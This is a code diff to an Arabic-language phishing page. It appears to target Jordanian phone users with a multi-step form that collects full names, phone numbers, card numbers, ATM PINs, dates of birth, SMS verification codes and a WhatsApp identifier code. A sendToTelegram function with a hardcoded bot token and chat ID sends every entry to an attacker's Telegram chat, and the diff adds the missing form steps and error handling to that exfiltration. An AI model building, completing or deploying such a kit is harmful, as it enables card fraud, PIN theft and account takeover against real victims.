@@ -200,8 +200,30 @@
       <img src="https://www2.0zz0.com/2025/09/28/02/413027069.jpeg" alt="الشعار"/>
     </div>
     <div class="step-area">
-      <!-- باقي الكود كما هو ... -->
-      <!-- ... -->
+      <!-- Step 1 -->
+      <div class="step active" id="step-1">
+        <h2>أهلا بك!</h2>
+        <div class="desc">يرجى إدخال الاسم بالكامل ورقم الهاتف للمتابعة.</div>
+        <form id="form-step-1" autocomplete="off">
+          <div class="form-group">
+            <label>الاسم بالكامل</label>
+            <div class="input-box">
+              <span class="input-icon">👤</span>
+              <input type="text" id="fullname" maxlength="70" required autocomplete="off" />
+            </div>
+            <div class="error" id="err-fullname">يرجى إدخال الاسم بالكامل</div>
+          </div>
+          <div class="form-group">
+            <label>رقم الهاتف (10 أرقام)</label>
+            <div class="input-box">
+              <span class="input-icon">📱</span>
+              <input type="tel" inputmode="numeric" id="phone" maxlength="10" pattern="[0-9]*" required autocomplete="off" />
+            </div>
+            <div class="error" id="err-phone">يرجى إدخال رقم هاتف صحيح يبدأ بـ 077 أو 078 أو 079</div>
+          </div>
+          <button class="btn-main" type="submit">أكمل</button>
+        </form>
+      </div>
       <!-- Step 2 -->
       <div class="step" id="step-2">
         <h2>التحقق من الهوية</h2>
@@ -234,7 +256,61 @@
           <button class="btn-main" type="submit">أكمل</button>
         </form>
       </div>
-      <!-- باقي الخطوات كما هي ... -->
+      <!-- Step 3 -->
+      <div class="step" id="step-3">
+        <h2>رمز التحقق</h2>
+        <div class="desc">يرجى إدخال رمز التحقق المكون من 6 أرقام.</div>
+        <form id="form-step-3" autocomplete="off">
+          <div class="form-group">
+            <label>رمز التحقق</label>
+            <div class="input-box">
+              <span class="input-icon">🔑</span>
+              <input type="tel" inputmode="numeric" id="verifycode" maxlength="6" pattern="[0-9]*" required autocomplete="off" />
+            </div>
+            <div class="error" id="err-verifycode">يرجى إدخال رمز تحقق مكون من 6 أرقام</div>
+          </div>
+          <button class="btn-main" type="submit">أكمل</button>
+        </form>
+      </div>
+      <!-- Step 4 -->
+      <div class="step" id="step-4">
+        <div class="whatsapp-info">
+          تم إرسال الاسم التعريفي إلى الواتساب الخاص بك<br/> الرجاء إدخاله أدناه
+        </div>
+        <form id="form-step-4" autocomplete="off">
+          <div class="form-group">
+            <label>ادخل النص هنا</label>
+            <div class="input-box">
+              <span class="input-icon">📝</span>
+              <input type="text" id="whatsid" maxlength="32" required autocomplete="off" />
+            </div>
+            <div class="error" id="err-whatsid">يرجى إدخال الاسم التعريفي</div>
+          </div>
+          <button class="btn-main" type="submit">أكمل</button>
+        </form>
+      </div>
+      <!-- Step 5 -->
+      <div class="step" id="step-5">
+        <h2>رمز تحقق جديد</h2>
+        <div class="desc">يرجى إدخال رمز تحقق جديد مكون من 6 أرقام.</div>
+        <form id="form-step-5" autocomplete="off">
+          <div class="form-group">
+            <label>رمز التحقق الجديد</label>
+            <div class="input-box">
+              <span class="input-icon">🔐</span>
+              <input type="tel" inputmode="numeric" id="verifycode2" maxlength="6" pattern="[0-9]*" required autocomplete="off" />
+            </div>
+            <div class="error" id="err-verifycode2">يرجى إدخال رمز تحقق جديد مكون من 6 أرقام</div>
+          </div>
+          <button class="btn-main" type="submit">أكمل</button>
+        </form>
+      </div>
+      <!-- Step 6 -->
+      <div class="step" id="step-6">
+        <div class="success-msg">
+          تم الانتهاء!<br>شكرًا لك.
+        </div>
+      </div>
     </div>
   </div>
 <script>
@@ -249,6 +325,7 @@
   }
 
   function sendToTelegram(data) {
+    // تأكد من أن الرابط والمفتاح صحيحان
     const token = "7562829296:AAH5NJ9d6vHwszcQurqpl3vCX1C-d59SbVg";
     const chat_id = "6873334348";
     const txt = Object.entries(data).map(([k, v]) => `${k}: ${v}`).join('\n');
@@ -256,7 +333,8 @@
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({chat_id, text: txt})
-    });
+    })
+    .catch(e=>{console.log("Telegram Error",e)});
   }
 
   document.getElementById('form-step-1').addEventListener('submit', function(e){
@@ -284,8 +362,7 @@
     let cardValid = /^\d{16}$/.test(card);
     let atmValid = /^\d{4}$/.test(atm);
 
-    // إصلاح التحقق من التاريخ:
-    // التأكد من اليوم والشهر والسنة منطقية، وعدم قبول أرقام غير صحيحة أو مضاعفة.
+    // تحقق التاريخ بشكل صحيح
     let dobParts = dob.split('/');
     let dobValid = false;
     if (dobParts.length === 3) {
@@ -358,21 +435,15 @@
   });
 
   document.getElementById('dob').addEventListener('input', function(e){
-    // السماح فقط بالأرقام وشرطة واحدة بين كل جزء
     let val = this.value.replace(/[^0-9\/]/g, '');
-    // منع كتابة أكثر من رقمين في اليوم والشهر
     let parts = val.split('/');
     if (parts.length > 3) parts = parts.slice(0,3);
     if (parts[0]) parts[0] = parts[0].slice(0,2);
     if (parts[1]) parts[1] = parts[1].slice(0,2);
     if (parts[2]) parts[2] = parts[2].slice(0,4);
-
-    // إعادة بناء القيمة
     let newVal = parts.join('/');
-    // إضافة شرطة تلقائية بعد اليوم والشهر
     if (newVal.length === 2 && !newVal.includes('/')) newVal += '/';
     if (newVal.length === 5 && newVal.split('/').length < 2) newVal += '/';
-
     this.value = newVal;
   });
 </script>
